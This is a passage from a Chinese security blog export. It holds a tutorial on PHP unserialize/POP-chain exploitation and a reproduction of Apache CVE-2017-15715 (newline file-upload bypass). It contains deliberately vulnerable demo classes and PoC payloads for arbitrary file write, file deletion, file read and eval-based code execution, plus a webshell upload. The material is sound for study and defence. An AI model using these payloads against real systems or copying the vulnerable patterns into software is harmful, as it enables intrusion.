__destruct()&#123;</span><br><span class="line">            echo $this-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = $_GET[&#x27;test&#x27;];</span><br><span class="line">$a_unser = unserialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这串代码，我们可以看到变量<code>$a</code>从url中test参数获取到内容，并且在反序列化的时候通过<code>__destruct()</code>直接将传入的数据不经过任何处理，echo出来，这里就存在反射型xss漏洞了。</p><p>在反序列化中,我们所能控制的数据就是对象中的各个属性值,所以在PHP的反序列化有一种漏洞利用方法叫做 “面向属性编程” ,即 POP( Property Oriented Programming)。和二进制漏洞中常用的ROP技术类似。在ROP中我们往往需要一段初始化gadgets来开始我们的整个利用过程,然后继续调用其他gadgets。在PHP反序列化漏洞利用技术POP中,对应的初始化gadgets就是<code>__wakeup()</code> 或者是<code>__destruct()</code> 方法, 在最理想的情况下能够实现漏洞利用的点就在这两个函数中,但往往我们需要从这个函数开始,逐步的跟进在这个函数中调用到的所有函数,直至找到可以利用的点为止。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>1.unserialize函数的参数可控<br>2.存在魔法函数<br>总结几个常用魔术方法及触发条件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__wakeup() //使用unserialize时触发</span><br><span class="line">__sleep() //使用serialize时触发</span><br><span class="line">__destruct() //对象被销毁时触发</span><br><span class="line">__call() //在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() //在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() //用于从不可访问的属性读取数据</span><br><span class="line">__set() //用于将数据写入不可访问的属性</span><br><span class="line">__isset() //在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() //在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString() //把类当作字符串使用时触发,返回值需要为字符串</span><br><span class="line">__invoke() //当脚本尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure><h2 id="1-几个可用的POP链方法"><a href="#1-几个可用的POP链方法" class="headerlink" title="1.几个可用的POP链方法"></a>1.几个可用的POP链方法</h2><p>命令执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">exec()</span><br><span class="line">passthru()</span><br><span class="line">popen()</span><br><span class="line">system()</span><br></pre></td></tr></table></figure><p>文件操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents()</span><br><span class="line">file_get_contents()</span><br><span class="line">unlink()</span><br></pre></td></tr></table></figure><p>如果在跟进程序过程中发现这些函数就要打起精神,一旦这些函数的参数我们能够控制,就有可能出现高危漏洞.</p><h2 id="2-POP链demo示例"><a href="#2-POP链demo示例" class="headerlink" title="2.POP链demo示例"></a>2.POP链demo示例</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class popdemo</span><br><span class="line">&#123;</span><br><span class="line">    private $data = &quot;demo\n&quot;;</span><br><span class="line">    private $filename = &#x27;./demo&#x27;;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        // TODO: Implement __wakeup() method.</span><br><span class="line">        $this-&gt;save($this-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">    public function save($filename)</span><br><span class="line">    &#123;</span><br><span class="line">        file_put_contents($filename, $this-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unserialize(file_get_contents(&#x27;./serialized.txt));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这是一个很简单的示例代码，且这个代码存在反序列化漏洞。该文件还定义了一个 popdemo 类,并且该类实现了 <code>__wakeup</code> 函数,然后在该函数中又调用了save函数，且参数对象是文件名。跟进save函数，我们看到在该函数中通过调用<code>file_put_contents</code>函数，这个函数的<code>$filename</code>和<code>data</code>属性值是从save函数中传出来的，并且创建了一个文件。由于<code>__wakeup()</code>函数在序列化时自动调用，这里还定义了一个保存文件的函数，在这个反序列化过程中对象的属性值可控。于是这里就存在一个任意文件写入任意文件内容的反序列化漏洞了。这就是所谓的POP。就是关注整个函数的调用过程中参数的传递情况,找到可利用的点,这和一般的Web漏洞没什么区别,只是可控制的值有直接传递给程序的参数转变为了对象中的属性值。</p><p>利用poc：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class popdemo</span><br><span class="line">&#123;</span><br><span class="line">    private $data = &quot;&lt;?php phpinfo();?&gt;\n&quot;;</span><br><span class="line">    private $filename = &#x27;./poc.php&#x27;;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        // TODO: Implement __wakeup() method.</span><br><span class="line">        $this-&gt;save($this-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">    public function save($filename)</span><br><span class="line">    &#123;</span><br><span class="line">        file_put_contents($filename, $this-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$demo = new popdemo();</span><br><span class="line">echo serialize($demo);</span><br><span class="line">file_put_contents(&quot;./serialized.txt&quot;,serialize($demo));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里定义了<code>$data</code>和<code>$filename</code>，然后序列化字符串后存储到serialized.txt文件中，序列化字符串：</p><p><img src="hao2m.png" alt="4"></p><p>然后运行demo代码，会在同目录下生成一个poc.php</p><p><img src="tzldu.png" alt="5"></p><h1 id="反序列化漏洞的利用"><a href="#反序列化漏洞的利用" class="headerlink" title="反序列化漏洞的利用"></a>反序列化漏洞的利用</h1><h2 id="1-利用构造函数等"><a href="#1-利用构造函数等" class="headerlink" title="1.利用构造函数等"></a>1.利用构造函数等</h2><p>php在使用unserialize()后会导致<code>__wakeup()</code> 或<code>__destruct()</code>的直接调用，中间无需其他过程。因此最理想的情况就是一些漏洞/危害代码在<code>__wakeup()</code> 或<code>__destruct()</code>中，从而当我们控制序列化字符串时可以去直接触发它们。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class pocdemo&#123;</span><br><span class="line">    function __construct($test)&#123;</span><br><span class="line">        $fp = fopen(&quot;shell.php&quot;,&quot;w&quot;) ;</span><br><span class="line">        fwrite($fp,$test);</span><br><span class="line">        fclose($fp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class l1nk3r&#123;</span><br><span class="line">    var $test = &#x27;123&#x27;;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $obj = new pocdemo($this-&gt;test);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$test = file_get_contents(&#x27;./ser.txt&#x27;);</span><br><span class="line">unserialize($test);</span><br><span class="line"></span><br><span class="line">require &quot;shell.php&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里代码主要是通过get方法通过test传入序列化好的字符串，然后在反序列化的时候自动调用<code>__wakeup()</code>函数，在<code>__wakeup()</code>函数中通过new pocdemo()会自动调用对象pocdemo中的<code>__construct()</code>，从而把<code>&lt;?php phpinfo(); ?&gt;</code>写入到shell.php中。</p><p>poc代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class l1nk3r&#123;</span><br><span class="line">    var $test = &#x27;&lt;?php phpinfo(); ?&gt;&#x27;;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        $obj = new pocdemo($this-&gt;test);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ser = new l1nk3r();</span><br><span class="line">$result = serialize($ser);</span><br><span class="line">print $result;</span><br><span class="line">file_put_contents(&#x27;./ser.txt&#x27;,$result);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="E:/机密文件/hexo/blog/source/_posts/php反序列化漏洞总结/pu7ob.png" alt="6">然后将这个序列化的字符重新导入到poc代码中，反序列化之后，就会生成一个shell.php,并且内容为<code>&lt;?php phpinfo(); ?&gt;</code></p><p><img src="4g1pi.png" alt="7"></p><p>存在漏洞的思路：一个类用于临时将日志储存进某个文件，当__destruct被调用时，日志文件将会被删除，比如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class logfile</span><br><span class="line">&#123;</span><br><span class="line">    //log文件名</span><br><span class="line">    public $filename = &#x27;error.log&#x27;;</span><br><span class="line">    //一些用于储存日志的代码</span><br><span class="line">    public function logdata($text)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#x27;log data:&#x27;.$text.&#x27;&lt;br /&gt;&#x27;;</span><br><span class="line">        file_put_contents($this-&gt;filename,$text,FILE_APPEND);</span><br><span class="line">    &#125;</span><br><span class="line">    //destrcuctor 删除日志文件</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#x27;__destruct deletes &#x27;.$this-&gt;filename.&#x27;file.&lt;br /&gt;&#x27;;</span><br><span class="line">        unlink(dirname(__FILE__).&#x27;/&#x27;.$this-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">//test5.php</span><br></pre></td></tr></table></figure><p>调用这个类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include &#x27;test5.php&#x27;</span><br><span class="line">class User</span><br><span class="line">&#123;</span><br><span class="line">    //类数据</span><br><span class="line">    public $age = 0;</span><br><span class="line">    public $name = &#x27;&#x27;;</span><br><span class="line">    //输出数据</span><br><span class="line">    public function printdata()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#x27;User &#x27;.$this-&gt;name.&#x27; is&#x27;.$this-&gt;age.&#x27; years old.&lt;br /&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//重建数据</span><br><span class="line">$usr = unserialize($_GET[&#x27;usr_serialized&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line">//一个示例代码</span><br></pre></td></tr></table></figure><p>GET[‘usr_serialized’]);$_GET[‘usr_serialized’]是可控的，那么我们就可以构造输入删除任意文件<br>构造输入删除目录下的index.php文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;test5.php&#x27;;</span><br><span class="line">$object = new logfile();</span><br><span class="line">$object-&gt;filename = &#x27;index.php&#x27;;</span><br><span class="line"></span><br><span class="line">echo serialize($object).&#x27;&lt;br /&gt;&#x27;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">//test7.php</span><br></pre></td></tr></table></figure><p>接下来先进入index.php：</p><p>接下来尝试使用test7.php删除了index.php，进入test7.php:<br>现在在目录里已经没有了index.php:</p><p>我们再次访问一下test7.php试一试：</p><p>index.php已经没有了。<br>这是一个简单的示例。</p><p>常见的注入点<br>上一部分展示了由于输入可控造成的__destruct函数删除任意文件，其实问题也可能存在于__wakeup、__sleep、__toString等其他magic函数，一切都取决于程序逻辑。比如，某用户类定义了一个__toString，为了让应用程序能够将类作为一个字符串输出（echo $object），而且其他类也可能定义了一个类允许__toString读取某个文件。<br>现在开始这个小实验，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include &#x27;test9.php&#x27;;</span><br><span class="line">$fileobj = new fileclass();</span><br><span class="line">$fileobj-&gt;filename = &#x27;hello.txt&#x27;;</span><br><span class="line"></span><br><span class="line">echo serialize($fileobj);</span><br><span class="line">?&gt;</span><br><span class="line">//test8.php</span><br></pre></td></tr></table></figure><p>我们先访问test8.php，结果如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class fileclass</span><br><span class="line">&#123;</span><br><span class="line">    //文件名</span><br><span class="line">    public $filename = &#x27;error.log&#x27;;</span><br><span class="line">    //当对象被作为一个字符串会读取这个文件</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        return file_get_contents($this-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class user</span><br><span class="line">&#123;</span><br><span class="line">    //class data</span><br><span class="line">    public $age = 0;</span><br><span class="line">    public $name = &#x27;&#x27;;</span><br><span class="line">    //允许对象作为一个字符串输出上面的data</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        return &#x27;user &#x27;.$this-&gt;name.&#x27; is &#x27;.$this-&gt;age.&#x27; years old.&lt;br /&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//用户可控</span><br><span class="line">$obj = unserialize($_GET[&#x27;usr_serialized&#x27;]);</span><br><span class="line">//输出__toString</span><br><span class="line">echo $obj</span><br><span class="line">?&gt;</span><br><span class="line">//test9.php</span><br></pre></td></tr></table></figure><p>接下来我们出发反序列化漏洞，获取hello.txt的内容：<br>构造url：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/test9.php?usr_serialized=O:9:%22fileclass%22:1:&#123;s:8:%22filename%22;s:9:%22hello.txt%22;&#125;</span><br></pre></td></tr></table></figure><p>访问：<br>可以看到hello.txt的内容：</p><h2 id="2-利用普通成员方法"><a href="#2-利用普通成员方法" class="headerlink" title="2.利用普通成员方法"></a>2.利用普通成员方法</h2><p>在反序列化的时候，当漏洞/危险代码存在类的普通方法中，就不能指望通过“自动调用”来达到目的了。这时的利用方法如下，寻找相同的函数名，把敏感函数和类联系在一起。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class l1nk3r &#123;</span><br><span class="line">    var $test;</span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $this-&gt;test = new CodeMonster();</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct() &#123;</span><br><span class="line">        $this-&gt;test-&gt;action();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class CodeMonster &#123;</span><br><span class="line">    function action() &#123;</span><br><span class="line">        echo &quot;CodeMonster&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class CodeMonster1 &#123;</span><br><span class="line">    var $test2;</span><br><span class="line">    function action() &#123;</span><br><span class="line">        eval($this-&gt;test2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$class6 = new l1nk3r();</span><br><span class="line">unserialize($_GET[&#x27;test&#x27;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>从代码上来看，来通过new 实例化一个新的l1nk3r对象后，调用<code>__construct()</code>，其中该函数又new了一个新的CodeMonster对象；这个对象的功能是定义了action()函数，并且打印CodeMonster。然后结束的时候调用<code>__destruct()</code>,在<code>__destruct()</code>会调用action()，因此页面会输出CodeMonster。</p><p><img src="3igq4.png" alt="8"></p><p>但是在代码中，我们看得到codermaster1对象中有一个eval()函数，这可是危险函数啊，那有什么方法，通过发序列化触发它呢，当然有了。刚刚在l1nk3r对象中，new的是CodeMonster，如果new的是CodeMonster1，那么自然就会进入CodeMonster1中，然后eval()函数中的<code>$test2</code>可控制，那么自然就可以实现远程代码执行了。</p><p>Poc：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class l1nk3r &#123;</span><br><span class="line">    var $test;</span><br><span class="line">    function __construct() &#123;</span><br><span class="line">        $this-&gt;test = new CodeMonster1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class CodeMonster1 &#123;</span><br><span class="line">    var $test2=&#x27;phpinfo();&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$class6 = new l1nk3r();</span><br><span class="line">print_r(serialize($class6));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>生成的序列化字符串：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;l1nk3r&quot;:1:&#123;s:4:&quot;test&quot;;O:11:&quot;CodeMonster1&quot;:1:&#123;s:5:&quot;test2&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="2o48f.png" alt="9"></p><h1 id="查找反序列化漏洞及构造exploit的方法"><a href="#查找反序列化漏洞及构造exploit的方法" class="headerlink" title="查找反序列化漏洞及构造exploit的方法"></a>查找反序列化漏洞及构造exploit的方法</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>PHP的 unserialize() 函数只能反序列化在当前程序上下文中已经被定义过的类.在传统的PHP中你需要通过使用一大串的include() 或者 require()来包含所需的类定义文件。于是后来出现了 autoloading 技术,他可以自动导入需要使用的类,再也不需要程序员不断地复制粘贴 那些include代码了。这种技术同时也方便了我们的漏洞利用.因为在我们找到一个反序列化点的时候我们所能使用的类就多了,那么实现漏洞利用的可能性也就更加高。</p><p>还有一个东西要提一下,那就是Composer,这是一个php的包管理工具,同时他还能自动导入所以依赖库中定义的类。这样一来 unserialize() 函数也就能使用所有依赖库中的类了,攻击面又增大不少。</p><p>1.Composer配置的依赖库存储在vendor目录下</p><p>2.如果要使用Composer的自动类加载机制,只需要在php文件的开头加上</p><p><code>require __DIR__ . &#39;/vendor/autoload.php&#39;</code>;</p><h2 id="漏洞发现技巧"><a href="#漏洞发现技巧" class="headerlink" title="漏洞发现技巧"></a>漏洞发现技巧</h2><p>默认情况下 Composer 会从 Packagist下载包,那么我们可以通过审计这些包来找到可利用的 POP链。</p><p>找PHP链的基本思路.</p><p>1.在各大流行的包中搜索 <code>__wakeup()</code> 和 <code>__destruct()</code> 函数.</p><p>2.追踪调用过程</p><p>3.手工构造 并验证 POP 链</p><p>4.开发一个应用使用该库和自动加载机制,来测试exploit.</p><h2 id="构造exploit的思路"><a href="#构造exploit的思路" class="headerlink" title="构造exploit的思路"></a>构造exploit的思路</h2><p>1.寻找可能存在漏洞的应用</p><p>2.在他所使用的库中寻找 POP gadgets</p><p>3.在虚拟机中安装这些库,将找到的POP链对象序列化,在反序列化测试payload</p><p>4.将序列化之后的payload发送到有漏洞web应用中进行测试.</p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞总结 </tag>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2017-15715漏洞复现</title>
      <link href="/2021/07/25/CVE-2017-15715%E6%BC%8F%E6%B4%9E%E6%B5%AE%E7%8E%B0/"/>
      <url>/2021/07/25/CVE-2017-15715%E6%BC%8F%E6%B4%9E%E6%B5%AE%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p><strong>Apache换行解析漏洞</strong></p><p><strong>影响版本</strong>：Apache 2.4.0~2.4.29</p><p><strong>影响说明</strong>：绕过服务器策略，上传webshell</p><p><strong>环境说明</strong>：PHP5.5 、 Apache2.4.10</p><span id="more"></span><p>漏洞复现利用如下</p><p>打开环境即是个文件上传点</p><p><img src="image-20210723090110218.jpg" alt="image-20210723090110218"></p><p>先上潮汐看</p><p><img src="image-20210723090159097.jpg" alt="image-20210723090159097"></p><p>Apache</p><p>百度搜一波</p><p>我们利用CVE-2017-15715(Apache换行解析漏洞)</p><blockquote><p>此漏洞的出现是由于 apache 在修复第一个后缀名解析漏洞时，用正则来匹配后缀。在解析 php 时 xxx.php\x0A 将被按照php 后缀进行解析，导致绕过一些服务器的安全策略。</p></blockquote><p>于是</p><p>上传一个php文件。注意，只能是<code>\x0A</code>，不能是<code>\x0D\x0A</code>，所以我们用hex功能在1.php后面添加一个<code>\x0A</code></p><p><img src="image-20210723090926609.jpg" alt="image-20210723090926609"></p><p>上传</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>成功</p><p>然后访问<code>/1.php%0A</code>，即可发现已经成功getshell</p><p><img src="image-20210723092640423.jpg" alt="image-20210723092640423"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
